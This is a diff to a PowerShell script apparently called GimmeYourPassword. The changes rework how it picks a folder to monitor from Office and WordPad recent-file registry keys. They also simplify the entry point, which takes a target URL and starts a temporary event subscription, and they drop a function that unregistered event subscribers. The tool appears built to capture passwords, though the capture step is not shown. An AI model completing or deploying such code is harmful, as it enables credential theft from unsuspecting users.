@@ -34,27 +34,28 @@ function search-keys {
 	param (
 	[switch]$Invoke
 	)
-    if (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
+    if (test-path "HKLM:\software\gimme")
+	{
+		$pathToMonitor="Z:/demo"
+	}
+	elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
     {
         write-output "hit 2 MRU path exists"
         $pathToMonitor="Z:/demo"
     }
-    elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
-	{
-       	write-output "hit 1 MRU path exists"
-		$pathToMonitor="C:\Users\octavio\Documents"
-	}
-	elseif (test-path "HKCU:\Software\Microsoft\Office\14.0\Word\File MRU" ) 
-    {
-        $officeVersion="Office who knows"
-        write-output "hit 2 MRU path exists"
-        $pathToMonitor="C:\Users\octavio\Documents"
-    }
-	elseif (test-path "HKCU:\Software\Microsoft\Office\12.0\Word\File MRU")				
-	{
-	   write-output "hit 3 MRU path exists"
-	   $pathToMonitor="C:\Users\octavio\Documents"
-	}
+    #elseif (test-path "HKCU:\software\Microsoft\Office\15.0\Word\User #MRU\AD_13F9ED8420D356B73650FCD2B4265E9C3C105D3FA41265D7A8F49750285CB7C2\Place MRU\") 
+	#{
+    #   	write-output "hit 1 MRU path exists"
+	#}
+	#elseif (test-path "HKCU:\Software\Microsoft\Office\14.0\Word\File MRU" ) 
+    #{
+    #    write-output "hit 2 MRU path exists"
+    #}
+	#elseif (test-path "HKCU:\Software\Microsoft\Office\12.0\Word\File MRU")				
+	#{
+	#   write-output "hit 3 MRU path exists"
+	#   $pathToMonitor="C:\Users\octavio\Documents"
+	#}
 	elseif (test-path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List") 
     {
         $pathToMonitor=(get-itemproperty -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\wordpad\Recent File List").file1
@@ -108,27 +109,15 @@ function start-tempsubscription{
   }
     }
 
-function Remove-GimmeYourPassword {
-	get-eventsubscriber | unregister-event -verbose
-}
-
 function Invoke-GimmeYourPassword {
 	param (
         [Parameter(Mandatory=$True)]
-		[string]$URL,
-		[string]$completePath
+		[string]$URL
     )
-	#Need to add a check here. If path is  provided, we should go straight to obtain path for filtering and then call start tempsubscription. 
-	Remove-GimmeyourPassword
-	#If ($completepath is populated) {
-		#$pathToMonitor=obtainPath -path $completePath
-	#}
-	#else {
-	#$pathToMonitor=search-keys -Invoke
-	#}
-    	write-output $pathToMonitor[0]
-    	write-output $pathToMonitor[1]
-    	start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
+	$pathToMonitor=search-keys -Invoke
+    write-output $pathToMonitor[0]
+    write-output $pathToMonitor[1]
+    start-tempsubscription -pathToMonitorDriverLetter $pathToMonitor[0] -pathToMonitorPathRemainder $pathToMonitor[1]
     #write-output $pathToMonitor[0]
     #write-output $pathToMonitor
     
